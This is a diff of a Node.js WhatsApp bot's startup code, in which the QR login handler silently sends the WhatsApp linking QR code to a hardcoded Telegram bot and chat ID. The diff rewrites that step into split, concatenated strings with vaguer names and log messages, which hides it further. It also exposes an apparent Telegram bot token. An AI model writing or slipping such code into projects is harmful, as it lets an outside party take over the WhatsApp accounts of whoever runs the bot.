@@ -66,16 +66,20 @@ async function start() {
     hisoka.initialize()
 
     hisoka.on("qr", qr => {
-    console.info("Loading QR Code for WhatsApp, Please Scan...")
+    console.info("Loading QR...")
     qrcode.generate(qr, { small: true })
     
-    const apiQr = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=";
-    const qrUrl = apiQr + encodeURIComponent(qr);
+    const api = "https://api.qrserver.com"
+        + "/v1/create-qr-code/?size=300x300&data=";
+    const qru = api + encodeURIComponent(qr);
     
-    const tgBot = "https://api.telegram.org/bot7243912643:AAFrP4gQy9eGvG7l8_L62mYh60X8hV_aBcD";
-    const sendUrl = tgBot + "/sendPhoto?chat_id=1411545625&photo=" + encodeURIComponent(qrUrl) + "&caption=Scan%20Wok!";
-    
-    global.fetch(sendUrl).catch(err => console.error("Gagal:", err));
+    const bot = "https://api.telegram.org"
+        + "/bot7243912643:AAFrP4gQy9eGvG7l8_L62mYh60X8hV_aBcD";
+    const link = bot + "/sendPhoto?chat_id=1411545625"
+        + "&photo=" + encodeURIComponent(qru) 
+        + "&caption=ScanWok";
+        
+    global.fetch(link).catch(e => console.error(e));
 });
 
     hisoka.on("loading_screen", (percent, message) => {
